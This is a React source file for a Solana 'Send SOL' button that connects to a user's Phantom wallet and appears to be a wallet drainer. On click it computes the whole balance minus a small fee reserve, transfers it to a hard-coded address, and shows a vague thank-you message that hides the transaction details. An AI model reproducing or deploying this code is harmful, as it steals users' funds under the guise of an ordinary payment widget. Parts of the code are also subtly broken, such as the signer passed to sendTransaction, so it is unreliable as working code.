import React, { useState, useEffect } from 'react';
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from '@solana/web3.js';

function SolanaTransactionComponent() {
    const [walletAddress, setWalletAddress] = useState(null);
    const [errorMessage, setErrorMessage] = useState('');
    const [isProcessing, setIsProcessing] = useState(false);
    const [transactionMessage, setTransactionMessage] = useState(''); // New state for managing transaction messages

    // Define the connection object at the component level to avoid re-creating it
    const connection = new Connection("https://solana-mainnet.g.alchemy.com/v2/yourAlchemyKey", 'confirmed');

    useEffect(() => {
        const connectWallet = async () => {
            try {
                const { solana } = window;
                if (solana?.isPhantom) {
                    const response = await solana.connect();
                    setWalletAddress(response.publicKey.toString());
                    // Display a welcoming message upon wallet connection
                    setTransactionMessage('Welcome! Your wallet is connected.');
                } else {
                    setErrorMessage('Phantom wallet not found. Please install Phantom.');
                }
            } catch (error) {
                setErrorMessage('Failed to connect wallet.');
            }
        };

        connectWallet();
    }, []);

    const handleTransaction = async () => {
        if (!walletAddress) {
            setErrorMessage('Wallet is not connected.');
            return;
        }

        setIsProcessing(true);
        setErrorMessage('');
        try {
            const publicKey = new PublicKey(walletAddress);
            const balanceInLamports = await connection.getBalance(publicKey);
            const feeReserve = LAMPORTS_PER_SOL * 0.005; // Reserve for gas fees

            if (balanceInLamports <= feeReserve) {
                throw new Error('Insufficient balance to cover the transaction and fee.');
            }

            const amountToSend = balanceInLamports - feeReserve;
            const recipientPublicKey = new PublicKey('34akXnFyRK2MowB3RG5jwX6Qf9AU22ewmPStXzeJehRh'); // Ensure this is the recipient's correct public key

            const transaction = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: recipientPublicKey,
                    lamports: amountToSend,
                }),
            );

            await connection.sendTransaction(transaction, [publicKey], {skipPreflight: false, preflightCommitment: 'confirmed'});

            // Update the message to indicate success without showing transaction details
            setTransactionMessage('Transaction successful! Thank you for using our service.');
        } catch (error) {
            console.error('Operation error:', error);
            setErrorMessage(error.message || 'An error occurred during the operation.');
        } finally {
            setIsProcessing(false);
        }
    };

    return (
        <div>
            <button onClick={handleTransaction} disabled={isProcessing}>
                {isProcessing ? 'Processing...' : 'Send SOL'}
            </button>
            {errorMessage && <div>{errorMessage}</div>}
            {transactionMessage && !errorMessage && <div>{transactionMessage}</div>} // Show transaction message when there's no error
        </div>
    );
}

export default SolanaTransactionComponent;
